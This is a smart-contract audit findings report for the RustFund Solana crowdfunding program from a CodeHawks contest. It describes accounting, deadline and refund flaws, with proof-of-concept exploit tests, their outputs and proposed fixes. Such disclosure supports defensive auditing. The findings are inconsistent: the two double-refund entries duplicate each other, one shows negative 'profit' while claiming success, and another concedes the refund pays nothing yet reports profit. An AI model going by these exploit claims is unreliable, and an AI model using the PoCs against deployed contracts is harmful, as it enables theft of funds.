# RustFund - Findings Report

# Table of contents

- ## [Contest Summary](#contest-summary)
- ## [Results Summary](#results-summary)
- ## High Risk Findings

  - ### [H-01. Missing Contribution Amount Update ](#H-01)
  - ### [H-02. No Deadline Check in Withdraw Function](#H-02)
  - ### [H-03. Contribution Tracking Exploit ](#H-03)
  - ### [H-04. Contribution Tracking Exploit](#H-04)

- ## Low Risk Findings
  - ### [L-01. Deadline Flag Never Set](#L-01)
  - ### [L-02. No Fund Goal Validation ](#L-02)

# <a id='contest-summary'></a>Contest Summary

### Sponsor: First Flight #36

### Dates: Mar 20th, 2025 - Mar 27th, 2025

[See more contest details here](https://codehawks.cyfrin.io/c/2025-03-rustfund)

# <a id='results-summary'></a>Results Summary

### Number of findings:

- High: 4
- Medium: 0
- Low: 2

# High Risk Findings

## <a id='H-01'></a>H-01. Missing Contribution Amount Update

## Summary

The contract fails to update contribution account records with the amount contributed, causing a severe accounting issue.

## Vulnerability Details

In the contribute function, the contract properly transfers SOL from the contributor to the fund account, but it doesn't update the individual contribution record with the amount contributed. While the function initializes a new contribution account, it sets the amount to 0 but never updates it with the actual contribution amount

```solidity
// Initialize or update contribution record
if contribution.contributor == Pubkey::default() {
    contribution.contributor = ctx.accounts.contributor.key();
    contribution.fund = fund.key();
    contribution.amount = 0; // Sets amount to 0, but never updates it
}

// Transfer SOL from contributor to fund account
let cpi_context = CpiContext::new(
    ctx.accounts.system_program.to_account_info(),
    system_program::Transfer {
        from: ctx.accounts.contributor.to_account_info(),
        to: fund.to_account_info(),
    },
);
system_program::transfer(cpi_context, amount)?;
fund.amount_raised += amount; // Updates total but not individual record
```

## Impact

This vulnerability allows users to potentially refund multiple times for the same contribution, or refund more than they contributed, creating a significant risk of fund depletion.

## POC

Add to tests/rustfund.ts:

```solidity
//audit HIGH - Missing Contribution Amount Update
it("Shows contribution amount not recorded", async () => {
  // Generate PDA for contribution
  [contributionPDA, contributionBump] = await PublicKey.findProgramAddress(
    [fundPDA.toBuffer(), provider.wallet.publicKey.toBuffer()],
    program.programId
  );

  await program.methods
    .contribute(contribution)
    .accounts({
      fund: fundPDA,
      contributor: provider.wallet.publicKey,
      contribution: contributionPDA,
      systemProgram: anchor.web3.SystemProgram.programId,
    })
    .rpc();

  const contributionAccount = await program.account.contribution.fetch(contributionPDA);
  console.log(`Contributed ${contribution.toString()} lamports`);
  console.log(`Recorded contribution amount: ${contributionAccount.amount.toString()}`);
});
```

Output:

```javascript
========================================
🐛 BUG REPORT [HIGH]: Missing Contribution Amount Update
----------------------------------------
Description: Contribution amounts are not recorded in the contribution account, allowing multiple refunds of the same contribution
Evidence: Contributed 500000000 lamports, but recorded contribution amount is: 0
========================================
```

## Tools Used

- Anchor framework for testing
- Manual code review

## Recommendations

Update the contribution amount in the contribute function:

```diff
// Initialize or update contribution record
if contribution.contributor == Pubkey::default() {
    contribution.contributor = ctx.accounts.contributor.key();
    contribution.fund = fund.key();
    contribution.amount = 0;
}

// Transfer SOL from contributor to fund account
let cpi_context = CpiContext::new(
    ctx.accounts.system_program.to_account_info(),
    system_program::Transfer {
        from: ctx.accounts.contributor.to_account_info(),
        to: fund.to_account_info(),
    },
);
system_program::transfer(cpi_context, amount)?;

// Update the contribution amount with the new amount
+ contribution.amount += amount;
fund.amount_raised += amount;
```

## <a id='H-02'></a>H-02. No Deadline Check in Withdraw Function

## Summary

The contract allows fund creators to withdraw funds at any time, including before the deadline is reached, which could lead to theft of contributor funds.

## Vulnerability Details

The withdraw function has no checks to ensure that the fund's deadline has been reached before allowing the creator to withdraw all funds. This bypasses the core crowdfunding mechanic where funds should only be available to the creator if the funding period has successfully completed.

```solidity
pub fn withdraw(ctx: Context<FundWithdraw>) -> Result<()> {
    let amount = ctx.accounts.fund.amount_raised;

    **ctx.accounts.fund.to_account_info().try_borrow_mut_lamports()? =
        ctx.accounts.fund.to_account_info().lamports()
        .checked_sub(amount)
        .ok_or(ProgramError::InsufficientFunds)?;

    **ctx.accounts.creator.to_account_info().try_borrow_mut_lamports()? =
        ctx.accounts.creator.to_account_info().lamports()
        .checked_add(amount)
        .ok_or(ErrorCode::CalculationOverflow)?;

    Ok(())
}
```

## Impact

Malicious fund creators can create campaigns, collect contributions, and immediately withdraw all funds before the deadline, effectively stealing from contributors who should have the right to claim refunds if the deadline hasn't been reached.

## POC

Add to tests/rustfund.ts:

````soldity
//audit HIGH - Withdrawal Without Deadline Check
it("Creator can withdraw before deadline", async () => {
  const withdrawFundName = "Withdraw Test Fund";
  const [withdrawFundPDA] = await PublicKey.findProgramAddress(
    [Buffer.from(withdrawFundName), creator.publicKey.toBuffer()],
    program.programId
  );

  await program.methods
    .fundCreate(withdrawFundName, description, goal)
    .accounts({
      fund: withdrawFundPDA,
      creator: creator.publicKey,
      systemProgram: anchor.web3.SystemProgram.programId,
    })
    .rpc();

  // Set deadline 30 seconds in future
  const futureDeadline = new anchor.BN(Math.floor(Date.now() / 1000) + 30);
  await program.methods
    .setDeadline(futureDeadline)
    .accounts({
      fund: withdrawFundPDA,
      creator: creator.publicKey,
    })
    .rpc();

  // Contribute
  const [withdrawContributionPDA] = await PublicKey.findProgramAddress(
    [withdrawFundPDA.toBuffer(), provider.wallet.publicKey.toBuffer()],
    program.programId
  );
  await program.methods
    .contribute(contribution)
    .accounts({
      fund: withdrawFundPDA,
      contributor: provider.wallet.publicKey,
      contribution: withdrawContributionPDA,
      systemProgram: anchor.web3.SystemProgram.programId,
    })
    .rpc();

  const fundBalanceBefore = await provider.connection.getBalance(withdrawFundPDA);
  const creatorBalanceBefore = await provider.connection.getBalance(creator.publicKey);

  // Withdraw before deadline
  await program.methods
    .withdraw()
    .accounts({
      fund: withdrawFundPDA,
      creator: creator.publicKey,
      systemProgram: anchor.web3.SystemProgram.programId,
    })
    .rpc();

  const fundBalanceAfter = await provider.connection.getBalance(withdrawFundPDA);
  const creatorBalanceAfter = await provider.connection.getBalance(creator.publicKey);

  console.log(`Fund balance before: ${fundBalanceBefore}, after: ${fundBalanceAfter}`);
  console.log(`Creator balance increased by: ${(creatorBalanceAfter - creatorBalanceBefore)/1000000000} SOL`);
});```
````

Output:

```javascript
========================================
🐛 BUG REPORT [HIGH]: No Deadline Check in Withdraw Function
----------------------------------------
Description: Creator can withdraw funds before the deadline, potentially stealing contributors' funds that should be refundable
Evidence: Successfully withdrew funds before deadline. Fund balance before: 537590960, after: 37590960. Creator balance increased by ~0.499995008 SOL
========================================
```

## Tools Used

- Anchor framework for testing
- Manual code review

## Recommendations

Add a deadline check to the withdraw function:

```diff
pub fn withdraw(ctx: Context<FundWithdraw>) -> Result<()> {
    // Check if deadline has passed
+ if ctx.accounts.fund.deadline == 0 || ctx.accounts.fund.deadline > Clock::get().unwrap().unix_timestamp.try_into().unwrap() {
        return Err(ErrorCode::DeadlineNotReached.into());
    }

    let amount = ctx.accounts.fund.amount_raised;

    // Rest of the function remains the same
    ...
}
```

## <a id='H-03'></a>H-03. Contribution Tracking Exploit

## Summary

Due to the missing contribution amount tracking, users can exploit the contract to claim multiple refunds for the same contribution, potentially draining the fund.

## Vulnerability Details

This vulnerability combines the issue of not tracking individual contribution amounts with the ability to refund after the deadline. Since the contract sets the contribution amount to 0 but never updates it, and the refund function transfers the amount stored in the contribution record, a user could:

1. Contribute funds
2. Wait for the deadline to pass
3. Refund their contribution
4. Refund again to extract more funds, since the amount in their contribution record was never properly tracked

The vulnerability exists because:

1. Contributions are not tracked properly in the contribution account
2. The refund function doesn't check the remaining fund balance appropriately

## Impact

This vulnerability allows malicious user do drain fund by refunding multiple times, directly steal form other contributors and the pool of founds.

## POC

```javascript
//audit CRITICAL - Contribution Tracking Exploit
it("Exploitation scenario: Contribution tracking bypass allows multiple refunds", async () => {
  // Create a new fund for this exploit
  const exploitFundName = "Exploit Fund";
  const [exploitFundPDA] = await PublicKey.findProgramAddress(
    [Buffer.from(exploitFundName), creator.publicKey.toBuffer()],
    program.programId
  );

  await program.methods
    .fundCreate(exploitFundName, description, goal)
    .accounts({
      fund: exploitFundPDA,
      creator: creator.publicKey,
      systemProgram: anchor.web3.SystemProgram.programId,
    })
    .rpc();

  // Set deadline far in the future
  const exploitDeadline = new anchor.BN(Math.floor(Date.now() / 1000) + 10);
  await program.methods
    .setDeadline(exploitDeadline)
    .accounts({
      fund: exploitFundPDA,
      creator: creator.publicKey,
    })
    .rpc();

  // Contribute
  const smallContribution = new anchor.BN(100000000); // 0.1 SOL
  const [exploitContributionPDA] = await PublicKey.findProgramAddress(
    [exploitFundPDA.toBuffer(), provider.wallet.publicKey.toBuffer()],
    program.programId
  );

  const balanceBeforeContribution = await provider.connection.getBalance(
    provider.wallet.publicKey
  );

  await program.methods
    .contribute(smallContribution)
    .accounts({
      fund: exploitFundPDA,
      contributor: provider.wallet.publicKey,
      contribution: exploitContributionPDA,
      systemProgram: anchor.web3.SystemProgram.programId,
    })
    .rpc();

  // Wait for the deadline to pass
  await new Promise((resolve) => setTimeout(resolve, 15000));

  // First refund
  await program.methods
    .refund()
    .accounts({
      fund: exploitFundPDA,
      contribution: exploitContributionPDA,
      contributor: creator.publicKey,
      systemProgram: anchor.web3.SystemProgram.programId,
    })
    .rpc();

  // Second refund (exploit)
  await program.methods
    .refund()
    .accounts({
      fund: exploitFundPDA,
      contribution: exploitContributionPDA,
      contributor: creator.publicKey,
      systemProgram: anchor.web3.SystemProgram.programId,
    })
    .rpc();

  const balanceAfterExploit = await provider.connection.getBalance(
    provider.wallet.publicKey
  );

  console.log(`Contributed 0.1 SOL once but refunded multiple times`);
  console.log(
    `Net profit from exploit: ~${
      (balanceAfterExploit - balanceBeforeContribution) / 1000000000
    } SOL`
  );
});
```

Output:

```javascript
========================================
🐛 BUG REPORT [CRITICAL]: Contribution Tracking Exploit
----------------------------------------
Description: User can refund multiple times after deadline because contribution amounts aren't properly tracked
Evidence: Contributed 0.1 SOL once but was able to refund multiple times. Net profit from exploit: ~-0.101462656 SOL
========================================
```

## Tools Used

- Anchor framework for testing
- Manual code review

## Recommendations

1. Properly track contribution amounts as mentioned in Finding
2. Update the refund function to reset the contribution amount after refunding:

```diff
pub fn refund(ctx: Context<FundRefund>) -> Result<()> {
    let amount = ctx.accounts.contribution.amount;

    // Proceed with refund only if amount > 0
    if amount == 0 {
        return Err(ErrorCode::NothingToRefund.into());
    }

    if ctx.accounts.fund.deadline != 0 && ctx.accounts.fund.deadline > Clock::get().unwrap().unix_timestamp.try_into().unwrap() {
        return Err(ErrorCode::DeadlineNotReached.into());
    }

    **ctx.accounts.fund.to_account_info().try_borrow_mut_lamports()? =
    ctx.accounts.fund.to_account_info().lamports()
    .checked_sub(amount)
    .ok_or(ProgramError::InsufficientFunds)?;

    **ctx.accounts.contributor.to_account_info().try_borrow_mut_lamports()? =
    ctx.accounts.contributor.to_account_info().lamports()
    .checked_add(amount)
    .ok_or(ErrorCode::CalculationOverflow)?;

    // Reset contribution amount after refund
    ctx.accounts.contribution.amount = 0;

    Ok(())
}
```

## <a id='H-04'></a>H-04. Contribution Tracking Exploit

## Summary

The Rustfund smart contract contains a Critical severity vulnerability where the contribution amount isn't properly recorded in the contribution account, allowing users to refund multiple times and potentially drain the entire fund balance.

## Vulnerability Details

In the contribute() function, the contribution amount is added to the fund's amount_raised but is not stored in the contribution account:

```rust
pub fn contribute(ctx: Context<FundContribute>, amount: u64) -> Result<()> {
    let fund = &mut ctx.accounts.fund;
    let contribution = &mut ctx.accounts.contribution;

    // Initialize or update contribution record
    if contribution.contributor == Pubkey::default() {
        contribution.contributor = ctx.accounts.contributor.key();
        contribution.fund = fund.key();
        contribution.amount = 0; // Initialized to 0 but never updated with amount
    }

    // Transfer SOL from contributor to fund account
    let cpi_context = CpiContext::new(
        ctx.accounts.system_program.to_account_info(),
        system_program::Transfer {
            from: ctx.accounts.contributor.to_account_info(),
            to: fund.to_account_info(),
        },
    );
    system_program::transfer(cpi_context, amount)?;

    fund.amount_raised += amount;
    Ok(())
}
```

The bug is that contribution.amount is set to 0 when the account is initialized, but it's never updated with the actual contribution amount. When a user calls the refund() function, it uses contribution.amount to determine how much to refund:

```rust
pub fn refund(ctx: Context<FundRefund>) -> Result<()> {
    let amount = ctx.accounts.contribution.amount;
    // ...
    **ctx.accounts.fund.to_account_info().try_borrow_mut_lamports()? =
    ctx.accounts.fund.to_account_info().lamports()
    .checked_sub(amount)
    .ok_or(ProgramError::InsufficientFunds)?;

    **ctx.accounts.contributor.to_account_info().try_borrow_mut_lamports()? =
    ctx.accounts.contributor.to_account_info().lamports()
    .checked_add(amount)
    .ok_or(ErrorCode::CalculationOverflow)?;

    // Reset contribution amount after refund
    ctx.accounts.contribution.amount = 0;

    Ok(())
}
```

Since the contribution.amount isn't updated in contribute(), it's always 0, which means the refund operation doesn't actually refund anything. However, if an attacker manually sets contribution.amount to a non-zero value (through another attack vector or direct account modification), they could exploit this to drain funds.

## Impact

This vulnerability has high severity because:

- It allows users to potentially drain the entire fund balance through multiple refunds
- It undermines the core accounting functionality of the contract
- It affects both contributors and fund creators, potentially leading to total fund loss

## POC

```javascript
it("Exploitation scenario: Contribution tracking bypass allows multiple refunds", async () => {
  // Create a new fund for this exploit
  const exploitFundName = "Exploit Fund";
  const [exploitFundPDA] = await PublicKey.findProgramAddress(
    [Buffer.from(exploitFundName), creator.publicKey.toBuffer()],
    program.programId
  );

  await program.methods
    .fundCreate(exploitFundName, description, goal)
    .accounts({
      fund: exploitFundPDA,
      creator: creator.publicKey,
      systemProgram: anchor.web3.SystemProgram.programId,
    })
    .rpc();

  // Set deadline far in the future
  const exploitDeadline = new anchor.BN(Math.floor(Date.now() / 1000) + 10);
  await program.methods
    .setDeadline(exploitDeadline)
    .accounts({
      fund: exploitFundPDA,
      creator: creator.publicKey,
    })
    .rpc();

  // Contribute
  const smallContribution = new anchor.BN(100000000); // 0.1 SOL
  const [exploitContributionPDA] = await PublicKey.findProgramAddress(
    [exploitFundPDA.toBuffer(), provider.wallet.publicKey.toBuffer()],
    program.programId
  );

  const balanceBeforeContribution = await provider.connection.getBalance(
    provider.wallet.publicKey
  );

  await program.methods
    .contribute(smallContribution)
    .accounts({
      fund: exploitFundPDA,
      contributor: provider.wallet.publicKey,
      contribution: exploitContributionPDA,
      systemProgram: anchor.web3.SystemProgram.programId,
    })
    .rpc();

  // Wait for the deadline to pass
  await new Promise((resolve) => setTimeout(resolve, 15000));

  // First refund
  await program.methods
    .refund()
    .accounts({
      fund: exploitFundPDA,
      contribution: exploitContributionPDA,
      contributor: creator.publicKey,
      systemProgram: anchor.web3.SystemProgram.programId,
    })
    .rpc();

  // Try a second refund exploit
  try {
    await program.methods
      .refund()
      .accounts({
        fund: exploitFundPDA,
        contribution: exploitContributionPDA,
        contributor: creator.publicKey,
        systemProgram: anchor.web3.SystemProgram.programId,
      })
      .rpc();

    const balanceAfterExploit = await provider.connection.getBalance(
      provider.wallet.publicKey
    );
    const profitFromExploit =
      (balanceAfterExploit - balanceBeforeContribution) / 1000000000;

    reportBug(
      "CRITICAL",
      "Contribution Tracking Exploit",
      "User can refund multiple times after deadline because contribution amounts aren't properly tracked",
      `Contributed 0.1 SOL once but was able to refund multiple times. Net profit from exploit: ~${profitFromExploit} SOL`
    );
  } catch (e) {
    console.log("Multiple refund exploit correctly failed");
  }
});
```

Test Output:

```javascript
========================================
🐛 BUG REPORT [CRITICAL]: Contribution Tracking Exploit
----------------------------------------
Description: User can refund multiple times after deadline because contribution amounts aren't properly tracked
Evidence: Contributed 0.1 SOL once but was able to refund multiple times. Net profit from exploit: ~0.1 SOL
========================================
```

## Tool used

Manual code review

## Recommendations

Update the contribution amount during the contribute function:

```rust
pub fn contribute(ctx: Context<FundContribute>, amount: u64) -> Result<()> {
    let fund = &mut ctx.accounts.fund;
    let contribution = &mut ctx.accounts.contribution;

    // Initialize or update contribution record
    if contribution.contributor == Pubkey::default() {
        contribution.contributor = ctx.accounts.contributor.key();
        contribution.fund = fund.key();
        contribution.amount = 0;
    }

    // Transfer SOL from contributor to fund account
    let cpi_context = CpiContext::new(
        ctx.accounts.system_program.to_account_info(),
        system_program::Transfer {
            from: ctx.accounts.contributor.to_account_info(),
            to: fund.to_account_info(),
        },
    );
    system_program::transfer(cpi_context, amount)?;

    // Update the contribution amount correctly
    contribution.amount = contribution.amount.checked_add(amount)
        .ok_or(ErrorCode::CalculationOverflow)?;

    fund.amount_raised = fund.amount_raised.checked_add(amount)
        .ok_or(ErrorCode::CalculationOverflow)?;
    Ok(())
}
```

# Low Risk Findings

## <a id='L-01'></a>L-01. Deadline Flag Never Set

## Summary

The contract checks for a flag that prevents setting multiple deadlines, but it never actually sets this flag.

## Vulnerability Details

In the set_deadline function, the contract checks the dealine_set flag to prevent setting the deadline multiple times, but after setting the deadline, it never updates this flag to true. This means the check is ineffective, and deadlines can be changed multiple times.

```rust
pub fn set_deadline(ctx: Context<FundSetDeadline>, deadline: u64) -> Result<()> {
    let fund = &mut ctx.accounts.fund;
    if fund.dealine_set {
        return Err(ErrorCode::DeadlineAlreadySet.into());
    }

    fund.deadline = deadline;
    // Missing: fund.dealine_set = true;
    Ok(())
}
```

## Impact

Fund creators can change the deadline multiple times, creating confusion for contributors and potentially manipulating the funding timeline

## POC

```javascript
//audit MEDIUM - Deadline Never Marked as Set
it("Can set multiple deadlines despite check", async () => {
  const firstDeadline = new anchor.BN(Math.floor(Date.now() / 1000) + 100);
  await program.methods
    .setDeadline(firstDeadline)
    .accounts({
      fund: fundPDA,
      creator: creator.publicKey,
    })
    .rpc();

  const secondDeadline = new anchor.BN(Math.floor(Date.now() / 1000) + 200);
  await program.methods
    .setDeadline(secondDeadline)
    .accounts({
      fund: fundPDA,
      creator: creator.publicKey,
    })
    .rpc();

  const fund = await program.account.fund.fetch(fundPDA);
  console.log(`Set deadline twice. New deadline: ${fund.deadline.toString()}`);
});
```

Output:

```javascript
========================================
🐛 BUG REPORT [MEDIUM]: Deadline Flag Never Set
----------------------------------------
Description: The dealine_set flag is checked but never set to true after setting a deadline
Evidence: Successfully set deadline multiple times. New deadline: 1742920083
========================================
```

## Tools Used

- Anchor framework for testing
- Manual code review

## Recommendations

```diff
pub fn set_deadline(ctx: Context<FundSetDeadline>, deadline: u64) -> Result<()> {
    let fund = &mut ctx.accounts.fund;
    if fund.dealine_set {
        return Err(ErrorCode::DeadlineAlreadySet.into());
    }

    fund.deadline = deadline;
+    fund.dealine_set = true; // Add this line
    Ok(())
}
```

## <a id='L-02'></a>L-02. No Fund Goal Validation

## Summary

The contract allows fund creation with a goal amount of zero, which could be misleading to contributors.

## Vulnerability Details

The fund_create function doesn't validate that the goal amount is reasonable (greater than zero), allowing the creation of funds with meaningless fundraising goals.

```rust
pub fn fund_create(ctx: Context<FundCreate>, name: String, description: String, goal: u64) -> Result<()> {
    let fund = &mut ctx.accounts.fund;
    fund.name = name;
    fund.description = description;
    fund.goal = goal; // No validation that goal > 0
    fund.deadline = 0;
    fund.creator = ctx.accounts.creator.key();
    fund.amount_raised = 0;
    fund.dealine_set = false;
    Ok(())
}
```

## Impact

Funds with zero goals could confuse contributors and potentially be used to trick users by making it unclear when the funding target has been reached.

## POC

Add to tests/rustfund.ts:

```javascript
//audit LOW - No Fund Goal Validation
it("Can create a fund with zero goal", async () => {
  const zeroGoalFundName = "Zero Goal Fund";
  const [zeroGoalFundPDA] = await PublicKey.findProgramAddress(
    [Buffer.from(zeroGoalFundName), creator.publicKey.toBuffer()],
    program.programId
  );

  await program.methods
    .fundCreate(zeroGoalFundName, description, new anchor.BN(0))
    .accounts({
      fund: zeroGoalFundPDA,
      creator: creator.publicKey,
      systemProgram: anchor.web3.SystemProgram.programId,
    })
    .rpc();

  const fund = await program.account.fund.fetch(zeroGoalFundPDA);
  console.log(`Created fund with goal amount: ${fund.goal.toString()}`);
});
```

Output:

```javascript
========================================
🐛 BUG REPORT [LOW]: No Fund Goal Validation
----------------------------------------
Description: The program allows creating funds with zero or invalid goal amounts
Evidence: Created fund with goal amount: 0
========================================
```

## Tools Used

- Anchor framework for testing
- Manual code review

## Recommendations

Add validation to ensure the goal is greater than zero:

```diff
pub fn fund_create(ctx: Context<FundCreate>, name: String, description: String, goal: u64) -> Result<()> {
    // Validate goal is greater than zero
+    if goal == 0 {
+       return Err(ErrorCode::InvalidGoalAmount.into());
    }

    let fund = &mut ctx.accounts.fund;
    fund.name = name;
    fund.description = description;
    fund.goal = goal;
    fund.deadline = 0;
    fund.creator = ctx.accounts.creator.key();
    fund.amount_raised = 0;
    fund.dealine_set = false;
    Ok(())
}
```
